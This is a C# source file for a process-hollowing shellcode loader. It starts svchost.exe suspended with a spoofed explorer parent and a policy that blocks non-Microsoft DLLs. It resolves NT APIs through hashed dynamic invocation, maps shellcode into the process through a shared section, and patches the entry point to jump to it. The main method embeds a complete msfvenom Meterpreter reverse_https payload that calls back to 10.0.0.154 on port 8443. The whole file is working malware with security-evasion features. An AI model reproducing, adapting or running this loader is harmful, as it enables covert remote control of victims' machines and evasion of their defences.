using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace simplehollowing
{
    public sealed class Loader
    {
        public static string strTargetProcess = "C:\\Windows\\system32\\notepad.exe";
        public const uint PageReadWriteExecute = 0x40;
        public const uint PageReadWrite = 0x04;
        public const uint PageExecuteRead = 0x20;
        public const uint MemCommit = 0x00001000;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;


        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void CloseHandle(IntPtr handle);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [DllImport("ntdll.dll")]
        public static extern uint RtlCreateProcessParametersEx(ref IntPtr pProcessParameters, IntPtr ImagePathName, IntPtr DllPath, IntPtr CurrentDirectory, IntPtr CommandLine, IntPtr Environment, IntPtr WindowTitle, IntPtr DesktopInfo, IntPtr ShellInfo, IntPtr RuntimeData, uint Flags);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetProcessIdOfThread(IntPtr handle);




        IntPtr section_;
        IntPtr localmap_;
        IntPtr remotemap_;
        IntPtr localsize_;
        IntPtr remotesize_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        uint size_;
        byte[] inner_;

        public uint round_to_page(uint size)
        {
            SYSTEM_INFO info = new SYSTEM_INFO();

            GetSystemInfo(ref info);

            return (info.dwPageSize - size % info.dwPageSize) + size;
        }

        const int AttributeSize = 24;

        private bool nt_success(long v)
        {
            return (v >= 0);
        }

        public IntPtr GetCurrent()
        {
            return GetCurrentProcess();
        }

        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {           
            var NtMapViewOfSection = DynamicInvoke.GetDelegate<Native.NtMapViewOfSection>("ad4b8f40e5337f1d1536bba738578522", true);
           
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;

            //long status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
            uint status = NtMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);

            if (status != 0)
                throw new SystemException("Something went wrong! " + status);

            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        public bool CreateSection(uint size)
        {
           
            var NtCreateSection = DynamicInvoke.GetDelegate<Native.NtCreateSection>("b93473116758de691631f40c199fa52b", true);
            

            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            uint status = NtCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);

            return nt_success(status);
        }

        public void SetLocalSection(uint size)
        {
            KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
            if (vals.Key == (IntPtr)0)
                throw new SystemException("[x] Failed to map view of section!");

            localmap_ = vals.Key;
            localsize_ = vals.Value;
        }

        public void CopyShellcode(byte[] buf)
        {
            long lsize = size_;
            if (buf.Length > lsize)
                throw new IndexOutOfRangeException("sc buffer is too long!");

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        
        public PROCESS_INFORMATION StartProcess(string path)
        {            
            string Command = "";
            var CreateUserProcess = DynamicInvoke.GetDelegate<Native.NtCreateUserProcess>("a94d1155ccc099603a91660f7d100c9f", true);
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();

            Process ParentProcess = Process.GetProcessesByName("explorer")[0];

            string data = string.Format("{0} {1}", path, Command);
            UnicodeString NtCommand = new UnicodeString();
            NtCommand.Length = (ushort)(data.Length * 2);
            NtCommand.MaximumLength = (ushort)(NtCommand.Length + 1);
            NtCommand.Buffer = Marshal.StringToHGlobalUni(data);

            data = String.Format("\\??\\{0}", path);
            UnicodeString NtImagePath = new UnicodeString();
            NtImagePath.Length = (ushort)(data.Length * 2);
            NtImagePath.MaximumLength = (ushort)(NtImagePath.Length + 1);
            NtImagePath.Buffer = Marshal.StringToHGlobalUni(data);

            IntPtr pImagePath = Marshal.AllocHGlobal(16);
            Marshal.StructureToPtr(NtImagePath, pImagePath, true);

            IntPtr pCommand = Marshal.AllocHGlobal(16);
            Marshal.StructureToPtr(NtCommand, pCommand, true);

            IntPtr pProcessParams = IntPtr.Zero;
            uint RtlCreateSuccess = RtlCreateProcessParametersEx(ref pProcessParams, pImagePath, IntPtr.Zero, IntPtr.Zero, pCommand, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x01);
            if (RtlCreateSuccess != 0)
            {
                Console.WriteLine("RtlCPP Failed");
            }

            PsCreateInfo info = new PsCreateInfo();
            info.Size = (UIntPtr)Marshal.SizeOf<PsCreateInfo>();
            info.State = PsCreateState.PsCreateInitialState;


            PsAttributeList attributeList = new PsAttributeList();
            attributeList.Init();

            //Image To Be Loaded
            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf<PsAttributeList>();
            attributeList.Attributes[0].Attribute = Native.PS_ATTRIBUTE_IMAGE_NAME;
            attributeList.Attributes[0].Size = (UIntPtr)NtImagePath.Length;
            attributeList.Attributes[0].Value = NtImagePath.Buffer;

            // Parent Process Spoofing
            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf<PsAttributeList>();
            attributeList.Attributes[1].Attribute = Native.PS_ATTRIBUTE_PARENT_PROCESS;
            attributeList.Attributes[1].Size = (UIntPtr)IntPtr.Size;
            attributeList.Attributes[1].Value = ParentProcess.Handle;


            //NON_MICROSOFT_BINARIES_ALWAYS_ON
            IntPtr pValue = Marshal.AllocHGlobal(UIntPtr.Size);
            Marshal.WriteInt64(pValue, Native.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf<PsAttributeList>();
            attributeList.Attributes[2].Attribute = Native.PS_ATTRIBUTE_MITIGATION_OPTIONS;
            attributeList.Attributes[2].Size = (UIntPtr)UIntPtr.Size;
            attributeList.Attributes[2].Value = pValue;

            IntPtr ProcessHandle = IntPtr.Zero;
            IntPtr ThreadHandle = IntPtr.Zero;

            //Create Process With Suspened State
            uint NtCreateSuccess = CreateUserProcess(ref ProcessHandle, ref ThreadHandle, Native.PROCESS_ALL_ACCESS, Native.THREAD_ALL_ACCESS, IntPtr.Zero, IntPtr.Zero, 0, Native.THREAD_CREATE_FLAGS_CREATE_SUSPENDED, pProcessParams, ref info, ref attributeList);
            if (NtCreateSuccess != 0)
            {
                Console.WriteLine("NtCUP Failed");                
            }         

            procInfo.hProcess = ProcessHandle;
            procInfo.hThread = ThreadHandle;
            procInfo.dwProcessId = (int)GetProcessIdOfThread(ProcessHandle);
            procInfo.dwThreadId = 0;

            return procInfo;
        }

        const ulong PatchSize = 0x10;

        public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

            unsafe
            {
                byte* p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8; // mov eax, <imm4>
                    i++;
                    Int32 val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48; // rex
                    i++;
                    p[i] = 0xb8; // mov rax, <imm8>
                    i++;

                    Int64 val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0; // jmp [r|e]ax
                i++;
            }
            return new KeyValuePair<int, IntPtr>(i, ptr);
        }

        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c)); // e_lfanew offset in IMAGE_DOS_HEADERS

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18); // IMAGE_OPTIONAL_HEADER start

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10); // entry point rva

                    int tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    // rva -> va
                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        public IntPtr FindEntry(IntPtr hProc)
        {

           
            var NtReadVirtualMemory = DynamicInvoke.GetDelegate<Native.NtReadVirtualMemory>("db5314760fd7298555bab342c1137312", true);
            var NtQueryInformationProcess = DynamicInvoke.GetDelegate<Native.NtQueryInformationProcess>("395e0e5012ce01a9148a45e8f383069a", true);
            

            PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            uint success = NtQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            if (!nt_success(success))
                throw new SystemException("[x] Failed to get process information!");

            IntPtr readLoc = IntPtr.Zero;
            byte[] addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }

            uint nRead = 0;

            if (NtReadVirtualMemory(hProc, readLoc, addrBuf, (uint)addrBuf.Length, ref nRead) != 0 || nRead == 0)
                throw new SystemException("[x] Failed to read process memory!");

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;
            if (NtReadVirtualMemory(hProc, readLoc, inner_, (uint)inner_.Length, ref nRead) != 0 || nRead == 0)
                throw new SystemException("[x] Failed to read module start!");

            return GetEntryFromBuffer(inner_);
        }

        public void MapAndStart(PROCESS_INFORMATION pInfo)
        {
           
            var NtWriteVirtualMemory = DynamicInvoke.GetDelegate<Native.NtWriteVirtualMemory>("274e21507fce26a09c731cb2a89f6702", true);
            var NtProtectVirtualMemory = DynamicInvoke.GetDelegate<Native.NtProtectVirtualMemory>("c09797ed8039245eacbc8afc05d71795", true);
            var NtReadVirtualMemory = DynamicInvoke.GetDelegate<Native.NtReadVirtualMemory>("db5314760fd7298555bab342c1137312", true);
            var NtResumeThread = DynamicInvoke.GetDelegate<Native.NtResumeThread>("8efd0cbc7410f60b07b2baad2824066e", true);
            

            KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
            if (tmp.Key == (IntPtr)0 || tmp.Value == (IntPtr)0)
                throw new SystemException("[x] Failed to map section into target process!");

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);

            try
            {

                IntPtr pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();                

                IntPtr baseAddress = pEntry_;
                uint NumberOfBytesToProtect = (uint)pSize;
                uint OldAccessProtection = 0;

                uint rst = NtProtectVirtualMemory(pInfo.hProcess, ref baseAddress, ref NumberOfBytesToProtect, 0x40, ref OldAccessProtection);

                if (NtWriteVirtualMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, ref tPtr) != 0 || tPtr == IntPtr.Zero)
                        throw new SystemException("Failed to write patch to start location!" + GetLastError());

                rst = NtProtectVirtualMemory(pInfo.hProcess, ref baseAddress, ref NumberOfBytesToProtect, 0x20, ref OldAccessProtection);

            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            byte[] tbuf = new byte[0x1000];
            uint nRead = 0;
            if (NtReadVirtualMemory(pInfo.hProcess, pEntry_, tbuf, 1024, ref nRead) != 0)
                throw new SystemException("Failed!");

            uint suspendCount = 0;
            uint res = NtResumeThread(pInfo.hThread, ref suspendCount);
            if (res == unchecked((uint)-1))
                throw new SystemException("Failed to restart thread!");

        }

        public IntPtr GetBuffer()
        {
            return localmap_;
        }
        ~Loader()
        {
           
            var NtUnmapViewOfSection = DynamicInvoke.GetDelegate<Native.NtUnmapViewOfSection>("84ae108241fdd90f70927402b4372687", true);
            

            uint res = 0;

            if (localmap_ != (IntPtr)0)
                res = NtUnmapViewOfSection(section_, localmap_);
        }

        public void Load(string targetProcess, byte[] shellcode)
        {

            PROCESS_INFORMATION pinf = StartProcess(targetProcess);
            FindEntry(pinf.hProcess);

            if (!CreateSection((uint)shellcode.Length))
                throw new SystemException("[x] Failed to create new section!");

            SetLocalSection((uint)shellcode.Length);

            CopyShellcode(shellcode);

            MapAndStart(pinf);

            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);
        }

        public Loader()
        {
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            remotemap_ = new IntPtr();
            localsize_ = new IntPtr();
            remotesize_ = new IntPtr();
            inner_ = new byte[0x1000];
        }
        static void Main(string[] args)
        {
            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.154 LPORT=8443 -f csharp
            byte[] buf = new byte[806] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,
0x40,0x20,0x8b,0x48,0x18,0x49,0x01,0xd0,0x50,0xe3,0x56,0x4d,0x31,0xc9,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0b,0x00,0x00,0x00,0x31,0x30,0x2e,0x30,0x2e,0x30,0x2e,0x31,0x35,0x34,
0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xfb,0x20,0x00,0x00,0x4d,0x31,0xc9,
0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,0x00,
0xff,0xd5,0xe8,0x00,0x01,0x00,0x00,0x2f,0x5a,0x73,0x4c,0x32,0x35,0x72,0x38,
0x41,0x52,0x38,0x35,0x69,0x43,0x32,0x4d,0x4a,0x42,0x67,0x62,0x4a,0x75,0x41,
0x79,0x6a,0x6c,0x50,0x4f,0x44,0x31,0x64,0x57,0x44,0x6e,0x73,0x64,0x37,0x72,
0x77,0x50,0x33,0x51,0x6a,0x58,0x42,0x74,0x52,0x6b,0x68,0x69,0x31,0x53,0x30,
0x5a,0x73,0x4d,0x6a,0x45,0x73,0x6c,0x4b,0x34,0x73,0x6d,0x59,0x41,0x7a,0x42,
0x62,0x4b,0x45,0x78,0x33,0x7a,0x47,0x62,0x34,0x41,0x52,0x43,0x62,0x76,0x62,
0x67,0x6c,0x4b,0x49,0x67,0x58,0x79,0x79,0x49,0x31,0x6d,0x74,0x35,0x67,0x6d,
0x53,0x47,0x6a,0x55,0x71,0x78,0x76,0x45,0x55,0x64,0x71,0x32,0x43,0x51,0x31,
0x76,0x65,0x49,0x42,0x4d,0x66,0x45,0x48,0x5f,0x47,0x6d,0x37,0x45,0x30,0x55,
0x48,0x32,0x45,0x71,0x72,0x4e,0x54,0x51,0x72,0x52,0x47,0x6c,0x73,0x74,0x38,
0x6a,0x4b,0x77,0x35,0x45,0x57,0x78,0x47,0x48,0x65,0x39,0x65,0x43,0x68,0x53,
0x43,0x41,0x45,0x35,0x78,0x6c,0x52,0x74,0x65,0x4c,0x61,0x65,0x4f,0x6b,0x50,
0x41,0x59,0x79,0x2d,0x57,0x4a,0x34,0x5a,0x56,0x6b,0x36,0x68,0x2d,0x35,0x4f,
0x6e,0x5a,0x50,0x44,0x58,0x5f,0x71,0x32,0x37,0x6b,0x62,0x4a,0x6a,0x30,0x70,
0x76,0x63,0x48,0x71,0x4e,0x6c,0x75,0x54,0x4c,0x35,0x70,0x4c,0x69,0x4f,0x59,
0x59,0x54,0x46,0x69,0x62,0x36,0x2d,0x4e,0x42,0x5f,0x39,0x34,0x2d,0x38,0x48,
0x35,0x35,0x63,0x58,0x6f,0x45,0x54,0x6e,0x31,0x61,0x69,0x50,0x4e,0x4d,0x62,
0x56,0x48,0x50,0x66,0x41,0x74,0x49,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,
0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,
0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,
0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,
0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,
0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,
0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,
0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,
0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,
0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,
0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,
0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,
0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,
0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,
0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,
0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            bool is64bit = true;

            if (is64bit)
                strTargetProcess = "C:\\Windows\\System32\\svchost.exe";
            else
                strTargetProcess = "C:\\Windows\\SysWOW64\\svchost.exe";

            Loader ldr = new Loader();
            try
            {
                ldr.Load(strTargetProcess, buf);
            }
            catch (Exception e)
            {
                Console.WriteLine("Something went wrong!" + e.Message);
            }
        }

    }
}